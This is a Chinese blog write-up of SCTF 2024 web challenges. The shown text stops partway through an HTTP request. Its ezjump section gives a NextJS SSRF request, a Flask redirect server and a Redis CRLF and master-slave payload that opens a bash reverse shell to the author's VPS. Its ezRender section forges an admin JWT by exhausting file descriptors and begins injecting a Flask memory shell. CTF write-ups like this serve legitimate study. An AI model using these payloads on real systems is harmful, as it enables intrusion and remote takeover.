@@ -1,0 +1,789 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="EddieMurphy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言有点小可惜吧，因为就差两道我们天枢就第一了。 还是自己能力不够，而且也没能力拿到证书，问心有愧，如果拿到xctf今年离大满贯又进一步吧。 但由于我们不是第一，所以分站赛还有的打，继续加油吧。 同时藉此复现一手思路，备战下旬网鼎杯（玛德网鼎杯怎么天枢老怪物全都出山了。。。。哈人） ezjump基本和学长从头看到尾的一道题，最后redis太搞了，slaveof的时候服务器删号你就打不进去，Octa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sctf-web-learning">
+<meta property="og:url" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/index.html">
+<meta property="og:site_name" content="EddieMurphy&#39;s blog">
+<meta property="og:description" content="前言有点小可惜吧，因为就差两道我们天枢就第一了。 还是自己能力不够，而且也没能力拿到证书，问心有愧，如果拿到xctf今年离大满贯又进一步吧。 但由于我们不是第一，所以分站赛还有的打，继续加油吧。 同时藉此复现一手思路，备战下旬网鼎杯（玛德网鼎杯怎么天枢老怪物全都出山了。。。。哈人） ezjump基本和学长从头看到尾的一道题，最后redis太搞了，slaveof的时候服务器删号你就打不进去，Octa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/image-20241005232229481.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/image-20241005232541594.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/image-20241005233349472.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/image-20241005233834211.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/image-20241005233935015.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/image-20241005234147752.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/image-20241006000009619.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/image-20241006000438952.png">
+<meta property="article:published_time" content="2024-10-05T15:14:40.000Z">
+<meta property="article:modified_time" content="2024-10-05T16:07:49.408Z">
+<meta property="article:author" content="EddieMurphy">
+<meta property="article:tag" content="比赛">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/image-20241005232229481.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>sctf-web-learning - EddieMurphy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"eddiemurphy89.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>EddieMurphy&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chainsaw_man.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sctf-web-learning"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-05 23:14" pubdate>
+          2024年10月5日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          4.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">sctf-web-learning</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有点小可惜吧，因为就差两道我们天枢就第一了。</p>
+<p>还是自己能力不够，而且也没能力拿到证书，问心有愧，如果拿到xctf今年离大满贯又进一步吧。</p>
+<p>但由于我们不是第一，所以分站赛还有的打，继续加油吧。</p>
+<p>同时藉此复现一手思路，备战下旬网鼎杯（玛德网鼎杯怎么天枢老怪物全都出山了。。。。哈人）</p>
+<h2 id="ezjump"><a href="#ezjump" class="headerlink" title="ezjump"></a>ezjump</h2><p>基本和学长从头看到尾的一道题，最后redis太搞了，slaveof的时候服务器删号你就打不进去，Octane通宵翻redis文档用CLIENT PAUSE改so文件打的，太超人了。</p>
+<p>我本地docker打的时候，死活注册不上，也不知道什么原因，远程就没问题。</p>
+<p>前面是一个CVE-2024-34351的<code>nextjs</code>漏洞：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/140319709#:~:text=CVE-2024-1">CVE-2024-34351 漏洞复现-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2434587">【网络安全】「漏洞复现」（五）从 NextJS SSRF 漏洞看 Host 头滥用所带来的危害-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p>而且dockerfile能看到后端网卡，报文直接打SSRF：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/success</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vps:port<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/x-component<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.193.141:3000/success<br><span class="hljs-attribute">Next-Action</span><span class="hljs-punctuation">: </span>b421a453a66309ec62a2d2049d51250ee55f10fd<br><span class="hljs-attribute">Next-Router-State-Tree</span><span class="hljs-punctuation">: </span>%5B%22%22%2C%7B%22children%22%3A%5B%22success%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------332929687741145380582296740589<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>336<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://vps:port<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-haskell"><span class="hljs-comment">-----------------------------332929687741145380582296740589</span></span><br><span class="language-haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;1_$<span class="hljs-type">ACTION_ID_b421a453a66309ec62a2d2049d51250ee55f10fd</span>&quot;</span></span><br><span class="language-haskell"></span><br><span class="language-haskell"></span><br><span class="language-haskell"><span class="hljs-comment">-----------------------------332929687741145380582296740589</span></span><br><span class="language-haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;0&quot;</span></span><br><span class="language-haskell"></span><br><span class="language-haskell">[<span class="hljs-string">&quot;$K1&quot;</span>]</span><br><span class="language-haskell"><span class="hljs-comment">-----------------------------332929687741145380582296740589--</span></span><br><span class="language-haskell"></span><br></code></pre></td></tr></table></figure>
+
+<p>vps上起一个重定向服务：[SCTF2024 Web&amp;Misc 复现 | 0pium’s Blog (hack3r0pium.github.io)](<a target="_blank" rel="noopener" href="https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&Misc-%E5%A4%8D%E7%8E%B0/index.html#:~:text=Web">https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&amp;Misc-复现/index.html#:~:text=Web</a> ezju)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/play&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-comment"># CORS preflight check</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;HEAD&#x27;</span>:<br>        response = Response()<br>        response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;text/x-component&#x27;</span><br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-comment"># after CORS preflight check</span><br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        ssrfUrl = <span class="hljs-string">&#x27;http://172.11.0.3:5000/&#x27;</span><br>        <span class="hljs-keyword">return</span> redirect(ssrfUrl)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">1717</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/10/05/sctf-web-learning/image-20241005232229481.png" srcset="/img/loading.gif" lazyload alt="image-20241005232229481"></p>
+<p>waf这里是一个字符串逃逸，也很简单有现成脚本，打下CRLF就可以了。</p>
+<p>然后app.py有个curl，虽然把gopher给ban了，但是大小写可绕，给赵哥整红温了，我们搁这dict:&#x2F;&#x2F;半天。。。。。。</p>
+<p>然后直接打一个主从就ok了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response, redirect<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/play&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-comment"># CORS preflight check</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;HEAD&#x27;</span>:<br>        response = Response()<br>        response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;text/x-component&#x27;</span><br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-comment"># after CORS preflight check</span><br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        payload=<span class="hljs-string">&quot;\r\n$3\r\npun\r\n&quot;</span><span class="hljs-comment">#闭合set命令</span><br>        <span class="hljs-comment">#按照下面的命令逐一来</span><br>        payload+=<span class="hljs-string">&quot;config set dir /tmp\r\n&quot;</span><br>        <span class="hljs-comment"># payload+=&quot;config set dbfilename exp.so\r\n&quot;</span><br>        <span class="hljs-comment"># payload+=&quot;slaveof vps 恶意redis的port也就是工具中的port\r\n&quot;</span><br>        <span class="hljs-comment"># payload+=&quot;module load /tmp/exp.so&quot;</span><br>        payload+=<span class="hljs-string">&quot;system.exec &#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps/反弹shell的port 0&gt;&amp;1\&quot;&#x27;\r\n&quot;</span><br>        exp=<span class="hljs-string">&quot;admin&quot;</span>*<span class="hljs-built_in">len</span>(payload)+payload<br>        ssrfUrl = <span class="hljs-string">f&#x27;http://172.11.0.3:5000/login?username=<span class="hljs-subst">&#123;quote(exp)&#125;</span>&amp;&amp;password=1&#x27;</span><br>        <span class="hljs-keyword">return</span> redirect(ssrfUrl)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">1717</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
+
+<p>或者用能直接system.rev的so文件。难绷的是打一次就要改一次文件重新放服务然后重新发包，挺繁琐的。折磨我们半天的掉线问题还真就出在so文件上。</p>
+<p><img src="/2024/10/05/sctf-web-learning/image-20241005232541594.png" srcset="/img/loading.gif" lazyload alt="image-20241005232541594"></p>
+<h2 id="ezRender"><a href="#ezRender" class="headerlink" title="ezRender"></a>ezRender</h2><p>以前没见过，但是队里赛棍学长见过。</p>
+<p>还真就是打ulimit。</p>
+<p>他生成jwt用到了&#x2F;dev&#x2F;random和时间戳，这里hint给了<strong>ulimit -n &#x3D; 2048</strong></p>
+<p>说人话就是同时允许最大打开2048个文件描述符（文件、套接字等），如果进程到了限制就会报错。</p>
+<p>那么我注册2048个账号后，他这个&#x2F;dev&#x2F;ramdom就会因为这个限制打不开了，所以jwt的密钥就剩下10位的时间戳了。</p>
+<p>借用<a target="_blank" rel="noopener" href="https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/#title-18">SCTF 2024 Writeup - 星盟安全团队 (xmcve.com)</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/register</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.220.229.60:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080/register<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>42<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin§1§&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin123&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>发包2048个以上。</p>
+<p>time_string 为admin2060时服务器返回的时间戳</p>
+<p>构造一手token：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># 指定时间字符串</span><br>time_string = <span class="hljs-string">&quot;Sun, 29 Sep 2024 06:03:45 GMT&quot;</span>  <br><br><span class="hljs-comment"># 转换为时间戳</span><br>timestamp = <span class="hljs-built_in">int</span>(time.mktime(time.strptime(time_string, <span class="hljs-string">&quot;%a, %d %b %Y %H:%M:%S %Z&quot;</span>)))<br><br><span class="hljs-comment"># 打印时间戳</span><br><span class="hljs-built_in">print</span>(timestamp) <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> User <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generateToken</span>(<span class="hljs-params">user</span>):<br>    secret=&#123;<span class="hljs-string">&quot;name&quot;</span>:user,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;<br>    <br>    verify_c=jwt.encode(secret, secret_key, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>    infor=&#123;<span class="hljs-string">&quot;name&quot;</span>:user,<span class="hljs-string">&quot;secret&quot;</span>:verify_c&#125;<br>    token=base64.b64encode(json.dumps(infor).encode()).decode()<br>    <span class="hljs-built_in">print</span>(infor)<br>    <span class="hljs-built_in">print</span>(token)<br><br><br>secret_key=<span class="hljs-string">&quot;1727589825&quot;</span><br>generateToken(<span class="hljs-string">&#x27;admin2060&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>然后换掉cookie，删除部分用户使存在用户少于2048个，服务正常。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/removeUser</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1.95.40.5:29351<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080/register<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-abnf"><span class="hljs-attribute">username</span><span class="hljs-operator">=</span>admin§<span class="hljs-number">1</span>§</span><br></code></pre></td></tr></table></figure>
+
+<p>code传参直接打入flask内存马：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1.95.40.5:29351<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080/register<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: 